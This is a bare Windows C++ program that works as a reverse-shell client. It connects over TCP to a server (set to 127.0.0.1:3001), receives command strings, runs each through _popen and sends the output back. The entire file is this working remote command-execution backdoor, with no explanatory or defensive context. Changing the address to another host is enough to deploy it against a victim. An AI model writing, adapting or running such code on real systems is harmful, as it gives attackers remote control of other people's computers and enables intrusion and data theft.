#include <winsock2.h>
#include <ws2tcpip.h> // For inet_pton
#include <windows.h>
#include <iostream>
#include <string>

#pragma comment(lib, "ws2_32.lib")

std::string exec_command(const std::string& cmd) {
    std::string result;
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "Failed to run command.\n";
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}

int main() {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    sockaddr_in serverAddr = {};
    const char* server_ip = "127.0.0.1";
    const int server_port = 3001;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        WSACleanup();
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(server_port);

    // Use inet_pton instead of inet_addr
    if (inet_pton(AF_INET, server_ip, &serverAddr.sin_addr) != 1) {
        std::cerr << "Invalid IP address\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connect failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cout << "[+] Connected to server " << server_ip << ":" << server_port << "\n";

    char recvbuf[4096];
    int recvlen;
    while ((recvlen = recv(sock, recvbuf, sizeof(recvbuf) - 1, 0)) > 0) {
        recvbuf[recvlen] = '\0';
        std::string command(recvbuf);

        std::cout << "[+] Received command: " << command << "\n";
        std::string output = exec_command(command);

        // Send output back to server
        send(sock, output.c_str(), static_cast<int>(output.size()), 0);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
